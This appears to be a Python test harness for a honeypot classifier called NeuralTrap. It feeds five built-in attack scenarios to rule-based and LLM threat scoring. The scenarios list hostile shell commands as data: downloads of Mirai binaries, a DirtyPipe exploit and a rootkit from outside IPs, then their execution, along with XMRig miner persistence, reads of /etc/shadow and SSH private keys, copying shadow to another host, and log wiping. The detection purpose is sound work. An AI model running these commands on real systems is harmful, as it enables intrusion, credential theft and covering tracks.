"""
NeuralTrap Attack Sequence Tester
=================================
Feed command sequences to the AI and watch it analyze them in real-time.
- Per-command LLM threat scoring
- Progressive session classification (every 3 commands, like neuraltrap.py)
- Full session analysis at the end
- 5 built-in real-world scenarios OR enter your own commands

Usage:
    python3 test_attack.py              # interactive menu
    python3 test_attack.py --scenario 1 # run scenario 1 directly
    python3 test_attack.py --custom     # type your own commands
"""

import sys
import time
from llm_classifier import classify_with_llm, rule_based_score
from cowrie_context import format_session_intel_for_llm, new_session_state

# ── Real-world attack scenarios ──────────────────────────────────────────────

SCENARIOS = {
    1: {
        "name": "Cryptominer Deployment (XMRig)",
        "description": "Attacker checks CPU, kills competing miners, downloads and runs XMRig with crontab persistence.",
        "commands": [
            "uname -a",
            "cat /proc/cpuinfo | grep -c processor",
            "free -m",
            "ps aux | grep -i mine",
            "kill -9 $(pgrep -f kinsing)",
            "kill -9 $(pgrep -f kdevtmpfsi)",
            "cd /tmp && curl -O http://pool.supportxmr.com/xmrig-6.21.0-linux-x64.tar.gz",
            "tar -xzf xmrig-6.21.0-linux-x64.tar.gz",
            "nohup ./xmrig -o pool.supportxmr.com:3333 -u 49aYSE... -p x --threads=$(nproc) &",
            'echo "@reboot /tmp/xmrig -o pool.supportxmr.com:3333" | crontab -',
            "history -c && rm -f ~/.bash_history",
        ],
        "intel": {
            "client_version": "SSH-2.0-libssh-0.6.3",
            "hassh": "a]7a0bf528c0e8ad0c0823e96768b7c2e",
            "login_fail_count": 0,
            "login_success_count": 1,
            "dwell_seconds": 23.5,
        },
    },
    2: {
        "name": "Mirai-Style IoT Botnet",
        "description": "Downloads multi-arch Mirai binaries, executes them, wipes logs.",
        "commands": [
            "cat /proc/version",
            "cat /etc/issue",
            "cd /tmp || cd /var/run || cd /mnt",
            "wget http://185.62.190.45/bins/mirai.x86 -O dvrHelper",
            "chmod 777 dvrHelper",
            "./dvrHelper",
            "busybox wget http://185.62.190.45/bins/mirai.arm -O dvrHelper",
            "chmod 777 dvrHelper",
            "./dvrHelper",
            "rm -rf /tmp/* /var/log/*",
        ],
        "intel": {
            "client_version": "SSH-2.0-PUTTY",
            "hassh": "c76cd4b4cbe07cfdebd6e1a9d0c9734f",
            "login_fail_count": 2,
            "login_success_count": 1,
            "dwell_seconds": 8.1,
        },
    },
    3: {
        "name": "SSH Lateral Movement & Credential Theft",
        "description": "Harvests credentials, steals SSH keys, scans network, pivots to other hosts.",
        "commands": [
            "whoami",
            "id",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "find / -name id_rsa 2>/dev/null",
            "find / -name authorized_keys 2>/dev/null",
            "cat /root/.ssh/id_rsa",
            "cat /root/.ssh/known_hosts",
            "arp -a",
            "for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i; done",
            "ssh -o StrictHostKeyChecking=no root@192.168.1.10",
            "scp /etc/shadow root@192.168.1.10:/tmp/",
        ],
        "intel": {
            "client_version": "SSH-2.0-OpenSSH_7.4",
            "hassh": "92674389fa1e47a27ddd8e6b3d0f8222",
            "login_fail_count": 3,
            "login_success_count": 1,
            "dwell_seconds": 187.4,
            "login_rows": [
                {"event_type": "cowrie.login.failed", "username": "admin", "password": "admin", "success": False, "fingerprint": None, "key_type": None},
                {"event_type": "cowrie.login.failed", "username": "root", "password": "123456", "success": False, "fingerprint": None, "key_type": None},
                {"event_type": "cowrie.login.failed", "username": "root", "password": "toor", "success": False, "fingerprint": None, "key_type": None},
                {"event_type": "cowrie.login.success", "username": "root", "password": "root", "success": True, "fingerprint": None, "key_type": None},
            ],
        },
    },
    4: {
        "name": "Linux Privilege Escalation & Rootkit",
        "description": "Checks kernel, finds SUID binaries, exploits DirtyPipe, installs kernel rootkit.",
        "commands": [
            "uname -r",
            "cat /etc/os-release",
            "sudo -l",
            "find / -perm -4000 -type f 2>/dev/null",
            "getcap -r / 2>/dev/null",
            "curl http://205.185.113.80/dirtypipe -o /tmp/exploit",
            "chmod +x /tmp/exploit",
            "/tmp/exploit",
            "id",
            "mkdir -p /lib/modules/$(uname -r)/kernel/drivers/misc",
            "wget http://205.185.113.80/rootkit.ko -O /lib/modules/$(uname -r)/kernel/drivers/misc/sysmod.ko",
            "insmod /lib/modules/$(uname -r)/kernel/drivers/misc/sysmod.ko",
            "echo sysmod >> /etc/modules",
            "rm -f /tmp/exploit /var/log/auth.log",
        ],
        "intel": {
            "client_version": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
            "hassh": "b12d2871a1189eff20364cf5333619ee",
            "login_fail_count": 1,
            "login_success_count": 1,
            "dwell_seconds": 95.3,
        },
    },
    5: {
        "name": "Slow & Stealthy Recon (APT-style)",
        "description": "Quiet reconnaissance — no malware, just careful information gathering before the real attack.",
        "commands": [
            "w",
            "last -5",
            "ls -la /var/log/",
            "cat /etc/hostname",
            "ip addr show",
            "ss -tulnp",
            "df -h",
            "crontab -l",
            "ls -la /opt /srv /var/www",
            "env",
        ],
        "intel": {
            "client_version": "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3",
            "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1",
            "login_fail_count": 0,
            "login_success_count": 1,
            "dwell_seconds": 312.6,
        },
    },
}


def build_session_intel(meta):
    """Build a session state dict from scenario metadata and format it for LLM."""
    session = new_session_state(meta.get("src_ip", "198.51.100.77"))
    session["client_version"] = meta.get("client_version")
    session["hassh"] = meta.get("hassh")
    session["login_fail_count"] = meta.get("login_fail_count", 0)
    session["login_success_count"] = meta.get("login_success_count", 0)
    session["dwell_seconds"] = meta.get("dwell_seconds")
    if "login_rows" in meta:
        session["login_rows"] = meta["login_rows"]
    return format_session_intel_for_llm(session)


def run_scenario(commands, intel_str=None):
    """Feed commands to the AI one by one, classify progressively, then give final analysis."""

    print("\n" + "=" * 70)
    print("  COMMAND-BY-COMMAND ANALYSIS")
    print("=" * 70)

    all_commands = []
    classifications = []

    for i, cmd in enumerate(commands, 1):
        # Per-command LLM score
        score = rule_based_score(cmd)

        bar_len = int(score * 30)
        bar = "█" * bar_len + "░" * (30 - bar_len)

        if score >= 0.7:
            label = "🔴 CRITICAL"
        elif score >= 0.4:
            label = "🟠 DANGEROUS"
        elif score >= 0.2:
            label = "🟡 SUSPICIOUS"
        else:
            label = "🟢 LOW"

        print(f"\n  CMD {i:2d} │ {cmd}")
        print(f"         │ Score: [{bar}] {score:.0%}  {label}")

        all_commands.append(cmd)

        # Progressive classification every 3 commands (same as neuraltrap.py)
        if len(all_commands) % 3 == 0:
            print(f"\n  ── 🧠 LLM SESSION CLASSIFICATION (after {len(all_commands)} commands) ──")
            result = classify_with_llm(all_commands, intel_str)
            print(f"     Type:       {result['attack_type']}")
            print(f"     Score:      {result['threat_score']:.0%}")
            print(f"     Confidence: {result['confidence']}")
            print(f"     Reasoning:  {result['reasoning']}")
            print(f"     Next move:  {result['predicted_next']}")
            classifications.append(result)

    # ── Final full-session classification ──
    print("\n" + "=" * 70)
    print("  FINAL SESSION ANALYSIS")
    print("=" * 70)

    result = classify_with_llm(all_commands, intel_str)

    score = result["threat_score"]
    bar_len = int(score * 40)
    bar = "█" * bar_len + "░" * (40 - bar_len)

    print(f"""
  Attack Type:     {result['attack_type']}
  Threat Score:    [{bar}] {score:.0%}
  Confidence:      {result['confidence']}
  Reasoning:       {result['reasoning']}
  Predicted Next:  {result['predicted_next']}

  Commands:        {len(all_commands)}
  Classifications: {len(classifications)} progressive + 1 final
""")

    # Show score progression if we had intermediate classifications
    if classifications:
        print("  SCORE PROGRESSION:")
        for i, c in enumerate(classifications):
            step = (i + 1) * 3
            s = c["threat_score"]
            b = "█" * int(s * 20)
            print(f"    After {step:2d} cmds: {s:.0%} {b} ({c['attack_type']})")
        s = result["threat_score"]
        b = "█" * int(s * 20)
        print(f"    Final:        {s:.0%} {b} ({result['attack_type']})")

    print("=" * 70)
    return result


def interactive_mode():
    """Let the user type commands one by one."""
    print("\n" + "=" * 70)
    print("  INTERACTIVE MODE — Type commands, press Enter after each")
    print("  Type 'done' when finished, 'quit' to exit")
    print("=" * 70)

    commands = []
    while True:
        try:
            cmd = input(f"\n  [{len(commands)+1}] $ ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if cmd.lower() in ("done", "quit", "exit", "q"):
            break
        if not cmd:
            continue

        commands.append(cmd)

        score = rule_based_score(cmd)
        bar_len = int(score * 30)
        bar = "█" * bar_len + "░" * (30 - bar_len)

        if score >= 0.7:
            label = "🔴 CRITICAL"
        elif score >= 0.4:
            label = "🟠 DANGEROUS"
        elif score >= 0.2:
            label = "🟡 SUSPICIOUS"
        else:
            label = "🟢 LOW"

        print(f"       Score: [{bar}] {score:.0%}  {label}")

        if len(commands) % 3 == 0:
            print(f"\n  ── 🧠 CLASSIFYING ({len(commands)} commands so far) ──")
            result = classify_with_llm(commands)
            print(f"     → {result['attack_type']} | {result['threat_score']:.0%} | {result['reasoning']}")

    if commands:
        print("\n  Analyzing full session...")
        run_scenario(commands)
    else:
        print("  No commands entered.")


def main():
    print("""
\033[91m
    ███╗   ██╗████████╗ ████████╗███████╗███████╗████████╗
    ████╗  ██║╚══██╔══╝ ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
    ██╔██╗ ██║   ██║       ██║   █████╗  ███████╗   ██║   
    ██║╚██╗██║   ██║       ██║   ██╔══╝  ╚════██║   ██║   
    ██║ ╚████║   ██║       ██║   ███████╗███████║   ██║   
    ╚═╝  ╚═══╝   ╚═╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
\033[0m
\033[93m    NeuralTrap — Attack Sequence Tester\033[0m
    """)

    # Handle CLI args
    if "--custom" in sys.argv:
        interactive_mode()
        return

    if "--scenario" in sys.argv:
        try:
            idx = sys.argv.index("--scenario")
            num = int(sys.argv[idx + 1])
            if num in SCENARIOS:
                sc = SCENARIOS[num]
                print(f"  Running: {sc['name']}")
                print(f"  {sc['description']}\n")
                intel_str = build_session_intel(sc["intel"])
                run_scenario(sc["commands"], intel_str)
                return
        except (IndexError, ValueError):
            pass
        print("  Invalid scenario number. Choose 1-5.")
        return

    # Interactive menu
    while True:
        print("  Choose a test:\n")
        print("  ┌─────────────────────────────────────────────────────────┐")
        for num, sc in SCENARIOS.items():
            print(f"  │  [{num}] {sc['name']:52s}│")
        print("  │                                                         │")
        print("  │  [6] Enter your own commands (interactive)              │")
        print("  │  [0] Exit                                               │")
        print("  └─────────────────────────────────────────────────────────┘")

        try:
            choice = input("\n  Select: ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == "0" or choice.lower() in ("q", "quit", "exit"):
            break

        if choice == "6":
            interactive_mode()
            input("\n  Press Enter to continue...")
            print()
            continue

        try:
            num = int(choice)
            if num in SCENARIOS:
                sc = SCENARIOS[num]
                print(f"\n  ▶ {sc['name']}")
                print(f"    {sc['description']}\n")
                intel_str = build_session_intel(sc["intel"])
                run_scenario(sc["commands"], intel_str)
                input("\n  Press Enter to continue...")
                print()
            else:
                print("  Invalid choice.\n")
        except ValueError:
            print("  Invalid choice.\n")


if __name__ == "__main__":
    main()
